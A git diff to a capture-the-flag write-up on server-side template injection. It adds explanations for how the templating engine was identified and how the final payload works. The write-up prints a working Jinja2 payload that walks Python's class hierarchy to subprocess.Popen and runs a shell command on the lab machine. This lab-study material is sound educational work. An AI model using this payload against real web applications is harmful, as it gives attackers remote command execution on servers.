@@ -9,7 +9,7 @@ Just introduces SSTI (Server side template injection) Basically, its sending dat
 
 ## Q2
 
-We are required to find out which character requence cause errors. After trying out a bunch of things, its `{{`
+We are required to find out which character requence cause errors. After trying out a bunch of things, its `{{`. The error is likely a syntax error, the interpreter expects a `}}` after `{{` and gives an error when it doesnt find it.
 
 ## Q3
 
@@ -21,7 +21,7 @@ We have to find out which tempeleting engine is being used. They have given a ve
 
 `{{7*7}}` Evaluated
 
-`{{7*'7'}}` Evaluated as `7777777`
+`{{7*'7'}}` Evaluated as `7777777` which is very pythonic. 
 
 So according to the tree, we are using Jinja2 or Twig
 
@@ -34,6 +34,12 @@ Jinja2 comments start with `{#`, but there are also other ways to start comments
 Explains how to make a ssti payload. Here we are finding the class of an empty string, and then using mro to get to other classes. One of them being subprocess which can be used to run shell commands
 
 This is the final command `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}` which gives output jake.
+
+`''.__class__.__mro__[1]` Gives us the object class.
+
+`__subclasses__()` gives us the subclasses in the object class, 401 is targeting the subprocess subclass.
+
+`("whoami", shell=True, stdout=-1).communicate()` is basicaalt the same as running `subprocess.Popen(...)`
 
 ## Q6
 
